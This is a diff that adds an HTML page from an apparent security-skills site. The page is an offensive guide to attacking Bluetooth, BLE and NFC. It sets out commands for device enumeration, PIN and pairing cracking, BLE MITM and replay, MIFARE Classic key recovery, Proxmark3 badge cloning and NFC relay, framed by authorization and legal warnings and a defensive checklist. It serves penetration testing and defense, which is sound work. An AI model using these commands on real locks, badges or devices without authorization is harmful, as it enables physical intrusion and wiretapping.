@@ -1,0 +1,244 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>attacking-bluetooth-nfc — SecSkills</title><link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E%F0%9F%9B%A1%EF%B8%8F%3C/text%3E%3C/svg%3E"><link rel="stylesheet" href="style.css"><style>
+    .shead{padding:56px 0 34px}
+    .crumb{font-family:var(--mono);font-size:12.5px;color:var(--muted);margin-bottom:20px}
+    .crumb a{color:var(--muted)}
+    h1.sk{font-family:var(--mono);font-size:clamp(24px,4vw,36px);font-weight:600;letter-spacing:-.02em}
+    .stags{display:flex;gap:16px;align-items:center;margin-top:16px;font-family:var(--mono);font-size:12.5px;color:var(--muted);flex-wrap:wrap}
+    .sdesc{margin-top:22px;font-size:17px;color:var(--muted);max-width:70ch;line-height:1.55}
+    .inst{margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    padding:13px 16px;font-family:var(--mono);font-size:13px;overflow-x:auto}
+    .inst .p{color:var(--faint);user-select:none}
+    article{padding:44px 0 72px;border-top:1px solid var(--border)}
+    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px}
+    article h3{font-size:16px;font-weight:640;margin:26px 0 8px}
+    article h4{font-size:14px;font-weight:640;margin:20px 0 6px;color:var(--muted)}
+    article p{margin:0 0 15px;max-width:74ch}
+    article ul,article ol{margin:0 0 16px;padding-left:22px;max-width:74ch}
+    article li{margin:5px 0}article li>ul{margin:5px 0}
+    article code{font-family:var(--mono);font-size:.86em;background:var(--surface);padding:1px 5px;border-radius:4px}
+    article a.xref code{color:var(--accent);background:color-mix(in srgb,var(--accent) 9%,var(--surface))}
+    article pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    padding:15px 16px;overflow-x:auto;margin:0 0 18px;max-width:100%}
+    article pre code{background:none;padding:0;font-size:12.5px;line-height:1.7}
+    article blockquote{margin:0 0 18px;padding:2px 0 2px 18px;border-left:2px solid var(--border2);color:var(--muted)}
+    .tw{overflow-x:auto;margin:0 0 18px}article table{border-collapse:collapse;width:100%;font-size:14px}
+    article th,article td{text-align:left;padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top}
+    article th{font-family:var(--mono);font-size:12px;color:var(--muted);font-weight:600}
+    </style></head><body>
+<div class="top"><div class="wrap"><a class="brand" href="index.html">secskills</a>
+<nav><a href="index.html#catalog">← all skills</a><a href="https://github.com/trilwu/secskills">github</a></nav>
+<button class="tbtn" id="tbtn" aria-label="Toggle theme">theme</button></div></div>
+<header class="shead"><div class="wrap">
+  <div class="crumb"><a href="index.html">secskills</a> / offense / attacking-bluetooth-nfc</div>
+  <h1 class="sk">attacking-bluetooth-nfc</h1>
+  <div class="stags">
+    <span><span class="dot dot-offense"></span> offense</span>
+    <span class="v"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg> verified 2026-07-27</span>
+  </div>
+  <p class="sdesc">Attack Bluetooth Classic, BLE, and NFC targets -- device enumeration, GATT characteristic exploitation, BLE MITM and replay, Ubertooth and nRF sniffing, MIFARE Classic cracking, Proxmark3 card cloning, NFC relay attacks, and access control bypass. Use when pentesting BLE peripherals or IoT devices, assessing NFC-based access controls or contactless payment security, testing Bluetooth pairing and authentication, or evaluating physical access card cloneability.</p>
+  <div class="inst"><span class="p">$ </span>/plugin install secskills-offense
+<span class="p">$ </span>/plugin install secskills-core</div>
+</div></header>
+<article><div class="wrap"><p>Bluetooth and NFC share a property with early Wi-Fi -- the protocols were designed for convenience in a trusted physical environment, and the trust assumption no longer holds. BLE devices routinely transmit sensitive data in cleartext because the GATT characteristic was "internal", and NFC access cards rely on cryptography that was broken years ago. Physical proximity is not access control.</p>
+<h2>When to Use</h2>
+<ul>
+<li>Assessing BLE peripherals or IoT devices with Bluetooth interfaces</li>
+<li>Testing NFC-based physical access controls (badge readers, door locks)</li>
+<li>Evaluating contactless payment card or transit card security</li>
+<li>Pentesting Bluetooth Classic services (RFCOMM, OBEX, SDP)</li>
+<li>Sniffing or intercepting BLE communication between device and app</li>
+<li>Cloning or replaying NFC/RFID credentials</li>
+</ul>
+<p><strong>Scope and authorization.</strong> RF work has a legal profile the rest of pentesting does not, because you cannot confine a radio to the target:</p>
+<ul>
+<li><strong>Interception is wiretap law.</strong> Capturing BLE or Bluetooth Classic traffic</li>
+</ul>
+<p>sweeps in whatever else is transmitting nearby — staff phones, medical devices, neighbouring tenants. In the US that implicates the Wiretap Act and ECPA; most jurisdictions have an equivalent. Test in a shielded enclosure or a controlled area where you can account for every device you capture, and discard non-target captures without analysing them.</p>
+<ul>
+<li><strong>Transmitting is regulated.</strong> Jamming, active BLE injection, and</li>
+</ul>
+<p>high-power relay setups can violate FCC Part 15 (or national equivalent) regardless of who owns the target device.</p>
+<ul>
+<li><strong>Cloned access credentials are physical keys.</strong> A duplicated badge is</li>
+</ul>
+<p>forgery-adjacent in many jurisdictions and gets you into spaces the engagement may not cover. Enumerate which doors are in scope before you clone, log every credential you produce, and destroy the clones at the end.</p>
+<p>Get physical-site authorization, an RF testing window, and a device inventory in writing — and carry the authorization letter, because RF testing is the scenario where you are most likely to be physically challenged mid-test.</p>
+<h2>When NOT to Use</h2>
+<ul>
+<li><strong>Wi-Fi attacks</strong> -- use <a class="xref" href="attacking-wireless-networks.html"><code>attacking-wireless-networks</code></a></li>
+<li><strong>Device firmware extraction and analysis beyond the RF interface</strong> -- use <a class="xref" href="analyzing-firmware-images.html"><code>analyzing-firmware-images</code></a></li>
+<li><strong>Mobile app security beyond the BLE communication layer</strong> -- use <a class="xref" href="testing-mobile-applications.html"><code>testing-mobile-applications</code></a></li>
+</ul>
+<h2>Bluetooth Classic</h2>
+<h3>Discovery and Enumeration</h3>
+<pre><code>hcitool scan                              # Discoverable devices
+hcitool inq                               # Extended inquiry (class, RSSI)
+hcitool info AA:BB:CC:DD:EE:FF            # Name, class, features
+hciconfig -a                              # Local adapters
+
+# bluetoothctl interactive
+bluetoothctl
+# scan on / devices / info AA:BB:CC:DD:EE:FF</code></pre>
+<h3>Service Discovery and RFCOMM</h3>
+<pre><code># SDP enumeration
+sdptool browse AA:BB:CC:DD:EE:FF          # All services
+sdptool search SP AA:BB:CC:DD:EE:FF       # Serial Port profile
+sdptool search OPUSH AA:BB:CC:DD:EE:FF    # OBEX Push
+
+# Connect to RFCOMM channel
+rfcomm connect /dev/rfcomm0 AA:BB:CC:DD:EE:FF 1
+screen /dev/rfcomm0 115200                # Interact as serial device</code></pre>
+<h3>PIN Brute-Forcing</h3>
+<pre><code>spooftooph -i hci0 -a AA:BB:CC:DD:EE:FF  # Spoof BT identity
+btcrack &lt;bd_addr_file&gt; &lt;pairing_capture&gt;  # Offline PIN cracking
+crackle -i capture.pcap -o decrypted.pcap # Crack BLE legacy pairing TK</code></pre>
+<h2>BLE (Bluetooth Low Energy)</h2>
+<h3>Scanning and GATT Enumeration</h3>
+<pre><code>hcitool lescan                            # Discover BLE devices
+bettercap -eval "ble.recon on"            # bettercap discovery
+# ble.enum AA:BB:CC:DD:EE:FF             # Enumerate services
+
+# gatttool interactive
+gatttool -b AA:BB:CC:DD:EE:FF -I
+# connect / primary / characteristics / char-desc
+# char-read-hnd 0x000e                   # Read by handle
+# char-write-req 0x000e 0100             # Write value
+# char-write-req 0x000f 0100             # Enable notifications
+
+# bettercap GATT operations
+# ble.read AA:BB:CC:DD:EE:FF &lt;svc_uuid&gt; &lt;char_uuid&gt;
+# ble.write AA:BB:CC:DD:EE:FF &lt;svc_uuid&gt; &lt;char_uuid&gt; &lt;hex&gt;</code></pre>
+<p>nRF Connect (mobile or desktop) is often fastest for interactive GATT browsing. Document findings with screenshots for characteristic UUIDs and properties.</p>
+<h3>Just Works Pairing</h3>
+<p>BLE "Just Works" provides no MITM protection. The Temporary Key is zero, so any observer within range can derive the Short-Term Key and decrypt traffic. If the device uses Just Works, report it -- Secure Connections with numeric comparison or passkey entry is the minimum.</p>
+<h2>BLE Attack Patterns</h2>
+<h3>MITM with GATTacker or BtleJuice</h3>
+<pre><code># GATTacker -- clone peripheral, proxy all GATT traffic
+node scan.js
+node advertise.js -a &lt;target_mac&gt;         # Fake peripheral
+node central.js -a &lt;target_mac&gt;           # Proxy to real device
+
+# BtleJuice (two BLE adapters required)
+btlejuice -u &lt;ws_url&gt; -w                  # Core: connects to real device
+btlejuice-proxy -i hci1                   # Proxy: advertises as clone
+# Web UI on port 8080 for intercept/modify</code></pre>
+<h3>Replay Attacks</h3>
+<p>Many BLE devices use static values for commands (unlock, configure). Capture the characteristic value, replay it from your own connection. If no nonce, counter, or session binding exists, the device accepts it.</p>
+<pre><code>gatttool -b AA:BB:CC:DD:EE:FF --char-read -a 0x0031        # Capture
+gatttool -b AA:BB:CC:DD:EE:FF --char-write-req -a 0x0031 -n &lt;hex&gt;  # Replay</code></pre>
+<p>Common in smart locks, BLE-enabled safes, and IoT actuators.</p>
+<h3>Other BLE Weaknesses</h3>
+<p><strong>Plaintext characteristics.</strong> IoT devices frequently expose Wi-Fi credentials, device tokens, and configuration on readable GATT characteristics without authentication. Enumerate and read everything.</p>
+<p><strong>Unsigned DFU.</strong> If Device Firmware Update over BLE lacks signature verification, modified firmware images are accepted. Look for Nordic DFU Service (UUID 0xFE59) or similar OTA services.</p>
+<h2>Bluetooth Sniffing</h2>
+<pre><code># Ubertooth One (Classic)
+ubertooth-rx -l &lt;LAP&gt;                     # Follow specific connection
+ubertooth-rx -r /tmp/bt.pcap             # Pipe to Wireshark
+ubertooth-specan                          # Spectrum analysis
+
+# nRF52840 dongle (BLE)
+# Flash nRF Sniffer firmware, then:
+wireshark -k -i /dev/ttyACM0              # Select device in toolbar</code></pre>
+<p><strong>Wireshark filters:</strong> <code>btle.advertising_header</code> (advertising), <code>btatt.handle == 0x000e</code> (specific handle), <code>btsmp</code> (pairing traffic). Use btbb plugin for Ubertooth Classic captures.</p>
+<h2>NFC</h2>
+<h3>Proxmark3</h3>
+<pre><code>proxmark3 /dev/ttyACM0                    # Start client
+
+# Card identification
+hf search                                 # High-frequency
+lf search                                 # Low-frequency
+
+# MIFARE Classic operations
+hf mf autopwn                             # Try defaults, then nested/hardnested
+hf mf dump                                # Dump entire card
+hf mf nested --1k --blk 0 -a -k FFFFFFFFFFFF    # Nested attack
+hf mf hardnested --blk 0 -a -k FFFFFFFFFFFF --tblk 4 --ta  # Hardnested
+
+# Clone and emulate
+hf mf restore                             # Write dump to blank card
+hf mf sim --1k                            # Emulate card
+hf mf csetuid --uid &lt;8_hex&gt;              # Set UID on magic card</code></pre>
+<h3>MIFARE Classic (Crypto1)</h3>
+<p>Crypto1 is broken. Key recovery takes seconds to minutes.</p>
+<p><strong>Attack hierarchy:</strong></p>
+<ol>
+<li><strong>Default keys</strong> -- FFFFFFFFFFFF, A0A1A2A3A4A5, D3F7D3F7D3F7. Many</li>
+</ol>
+<p>deployments never change them.</p>
+<ol>
+<li><strong>Nested attack</strong> -- one known key recovers all sector keys.</li>
+<li><strong>Hardnested attack</strong> -- one known key on any sector derives others.</li>
+<li><strong>Darkside attack</strong> -- some variants, no known keys needed.</li>
+</ol>
+<p>If MIFARE Classic is the sole access control credential, the finding is critical.</p>
+<h3>MIFARE DESFire</h3>
+<p>DESFire uses AES/3DES -- direct key recovery is not feasible. Focus on default application keys (often all zeros), key diversification weaknesses, and whether the backend validates beyond UID.</p>
+<h3>libnfc</h3>
+<pre><code>nfc-list                                  # List NFC devices
+nfc-mfclassic r a dump.mfd               # Read card
+nfc-mfclassic w a dump.mfd               # Write card</code></pre>
+<h2>NFC and Access Control</h2>
+<h3>Cloning Badges</h3>
+<pre><code>hf 14a reader                             # Read card UID
+hf mf autopwn                             # Crack keys
+hf mf dump                                # Dump contents
+hf mf cload                               # Write to magic clone card</code></pre>
+<p>Many access control systems check only UID, not encrypted sector data. UID cloning is trivial and defeats these deployments entirely.</p>
+<h3>Relay Attacks (NFCGate)</h3>
+<p>NFC relay forwards card communication over a network link in real time. Two Android devices running NFCGate: one near the reader, one near the victim's card. The reader sees a valid interaction despite the card being physically elsewhere. Defeats proximity assumptions.</p>
+<h3>NDEF Records</h3>
+<pre><code>hf mfu ndefread                           # Read NDEF data
+# May contain: URLs, Wi-Fi credentials, BT pairing data, app data</code></pre>
+<p>Writable NFC tags in public spaces can be overwritten with malicious NDEF records (phishing URLs, rogue Wi-Fi provisioning).</p>
+<h2>Common Findings</h2>
+<div class="tw"><table><thead><tr><th>Finding</th><th>Severity</th><th>Notes</th></tr></thead><tbody><tr><td>Static BLE pairing / Just Works</td><td>High</td><td>Passive eavesdropping, MITM</td></tr><tr><td>Unencrypted GATT characteristics</td><td>High</td><td>No pairing required to read</td></tr><tr><td>Replay of static BLE commands</td><td>High</td><td>No nonce or session binding</td></tr><tr><td>Default Bluetooth Classic PINs</td><td>Medium</td><td>0000/1234, brute-forceable</td></tr><tr><td>MIFARE Classic access control</td><td>Critical</td><td>Crypto1 broken; minutes to crack</td></tr><tr><td>UID-only access validation</td><td>Critical</td><td>Trivial cloning</td></tr><tr><td>Unsigned BLE DFU</td><td>High</td><td>Arbitrary code on device</td></tr><tr><td>Writable NFC tags, no auth</td><td>Medium</td><td>Content replacement</td></tr><tr><td>No mutual authentication</td><td>High</td><td>Any central can connect</td></tr><tr><td>Default DESFire app keys</td><td>High</td><td>All-zero on initial deploy</td></tr></tbody></table></div>
+<h2>Defensive Review Checklist</h2>
+<ul>
+<li>[ ] BLE uses Secure Connections pairing (numeric comparison or passkey)</li>
+<li>[ ] Sensitive GATT characteristics require bonding and encryption</li>
+<li>[ ] BLE commands include session-bound nonces or counters</li>
+<li>[ ] DFU validates firmware signatures before applying</li>
+<li>[ ] NFC cards use DESFire or better, not MIFARE Classic</li>
+<li>[ ] Access control validates sector data, not just UID</li>
+<li>[ ] Card keys diversified per card</li>
+<li>[ ] Public NFC tags read-only or authenticated</li>
+<li>[ ] Bluetooth Classic services require auth before data access</li>
+<li>[ ] Relay mitigations in place (distance bounding, timing)</li>
+</ul>
+<h2>Rationalizations to Reject</h2>
+<ul>
+<li><em>"The device is only accessible within Bluetooth range."</em> Range</li>
+</ul>
+<p>extenders, directional antennas, and relay attacks stretch 10 meters to 100. Proximity is not a security boundary.</p>
+<ul>
+<li><em>"We use BLE encryption."</em> Without Secure Connections, the Temporary</li>
+</ul>
+<p>Key is zero and traffic is decryptable by any passive observer.</p>
+<ul>
+<li><em>"The NFC cards use encryption (MIFARE Classic)."</em> Crypto1 has been</li>
+</ul>
+<p>publicly broken since 2008. Key recovery takes minutes.</p>
+<ul>
+<li><em>"Physical access is required, so the risk is low."</em> A badge on a</li>
+</ul>
+<p>lanyard and a BLE device on a shelf are within reach of anyone who can walk through a lobby.</p>
+<ul>
+<li><em>"We will detect cloned cards at the backend."</em> Most deployments do</li>
+</ul>
+<p>not correlate usage patterns or detect concurrent use. Verify with evidence.</p>
+<ul>
+<li><em>"The BLE characteristic is not documented."</em> GATT enumeration is</li>
+</ul>
+<p>automatic. Every characteristic is discoverable in seconds.</p>
+<ul>
+<li><em>"Our BLE firmware updates use a proprietary format."</em> Proprietary</li>
+</ul>
+<p>format is not a signing mechanism. No signature check means the update is replaceable.</p>
+<h2>References</h2>
+<ul>
+<li><a class="xref" href="attacking-wireless-networks.html"><code>attacking-wireless-networks</code></a> -- Wi-Fi attacks and wireless reconnaissance</li>
+<li><a class="xref" href="analyzing-firmware-images.html"><code>analyzing-firmware-images</code></a> -- extracting and analyzing device firmware</li>
+<li><a class="xref" href="testing-mobile-applications.html"><code>testing-mobile-applications</code></a> -- mobile app testing beyond the BLE layer</li>
+<li><a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a> -- detection rules for Bluetooth and NFC abuse</li>
+</ul></div></article>
+<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script></body></html>
